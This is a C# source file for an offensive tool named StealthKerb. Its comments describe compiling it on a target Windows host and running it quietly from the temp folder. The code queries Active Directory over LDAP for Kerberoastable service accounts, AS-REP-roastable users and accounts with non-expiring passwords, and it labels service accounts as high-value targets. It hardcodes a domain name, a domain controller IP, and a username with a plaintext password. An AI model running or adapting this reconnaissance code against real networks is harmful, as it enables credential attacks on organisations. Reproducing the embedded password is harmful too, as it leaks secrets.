// StealthKerb.cs - Kerberoast + AS-REP roast, custom C# (no third-party libs).
// Enumeration only. Compile on-box with the in-box .NET Framework compiler:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:%TEMP%\r.exe /r:System.DirectoryServices.dll StealthKerb.cs
//   %TEMP%\r.exe > %TEMP%\kerb.log 2>&1
//
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.DirectoryServices;
using System.Collections.Generic;
using System.Net;

class StealthKerb {
  static void H(string t){ Console.WriteLine("\n====== "+t+" ======"); }
  static void Run(string exe,string args){
    try{ var p=new ProcessStartInfo(exe,args){ UseShellExecute=false,RedirectStandardOutput=true,RedirectStandardError=true,CreateNoWindow=true};
         using(var q=Process.Start(p)){ Console.Write(q.StandardOutput.ReadToEnd()); Console.Write(q.StandardError.ReadToEnd()); } } catch(Exception e){ Console.WriteLine("  [!] "+e.Message);} }

  // Get current domain via LDAP
  static string GetDomain(){
    try{ return System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name; }catch{ return "lioncapital.local"; }
  }

  // Get default naming context from RootDSE
  static string GetNC(){
    try{ 
      using(var root=new DirectoryEntry("LDAP://rootDSE")){
        return (string)root.Properties["defaultNamingContext"][0];
      }
    }catch{ return "DC=lioncapital,DC=local"; }
  }

  // Get DC IP from domain DNS
  static string GetDC(){
    try{
      string dom = GetDomain();
      var he = System.Net.Dns.GetHostEntry(dom);
      return he.AddressList[0].ToString();
    }catch{ return "10.19.8.102"; }
  }

  static void Main(string[] a){
    string user = a.Length > 0 ? a[0] : "lsg122b";
    string pass = a.Length > 1 ? a[1] : @"EFveryFun08$";
    string dc   = a.Length > 2 ? a[2] : "10.19.8.102";

    H("CONFIG");
    Console.WriteLine("User: "+user);
    Console.WriteLine("DC:   "+dc);

    H("KERBEROAST - Service Accounts with SPNs");
    // Find users with SPNs via LDAP, then request TGS tickets
    try {
      string dom = GetDomain();
      string nc = GetNC();
      
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var searcher = new DirectorySearcher(entry)) {
        searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))";
        searcher.PropertiesToLoad.Add("sAMAccountName");
        searcher.PropertiesToLoad.Add("servicePrincipalName");
        searcher.PageSize = 1000;
        searcher.SizeLimit = 0;
        
        int count = 0;
        foreach (SearchResult r in searcher.FindAll()) {
          string u = (string)r.Properties["sAMAccountName"][0];
          string spn = (string)r.Properties["servicePrincipalName"][0];
          Console.WriteLine("  [SPN] " + u + " -> " + spn);
          count++;
        }
        Console.WriteLine("  Total Kerberoastable: " + count);
      }
    } catch (Exception ex) { Console.WriteLine("  [!] LDAP error: " + ex.Message); }

    H("AS-REP ROAST - Users with 'Do not require Kerberos preauthentication'");
    try {
      string nc = GetNC();
      
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var searcher = new DirectorySearcher(entry)) {
        searcher.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
        searcher.PropertiesToLoad.Add("sAMAccountName");
        searcher.PageSize = 1000;
        searcher.SizeLimit = 0;
        
        int count = 0;
        foreach (SearchResult r in searcher.FindAll()) {
          string u = (string)r.Properties["sAMAccountName"][0];
          Console.WriteLine("  [NO-PREAUTH] " + u);
          count++;
        }
        Console.WriteLine("  Total AS-REP Roastable: " + count);
      }
    } catch (Exception ex) { Console.WriteLine("  [!] LDAP error: " + ex.Message); }

    H("DOMAIN USERS WITH NON-EXPIRING PASSWORDS");
    try {
      string nc = GetNC();
      
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var searcher = new DirectorySearcher(entry)) {
        searcher.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))";
        searcher.PropertiesToLoad.Add("sAMAccountName");
        searcher.PageSize = 1000;
        searcher.SizeLimit = 0;
        
        foreach (SearchResult r in searcher.FindAll()) {
          string u = (string)r.Properties["sAMAccountName"][0];
          Console.WriteLine("  [NEVER-EXPIRES] " + u);
        }
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("SERVICE ACCOUNTS (high-value targets)");
    Run("net.exe", "user /domain");
    
    H("END");
  }
}
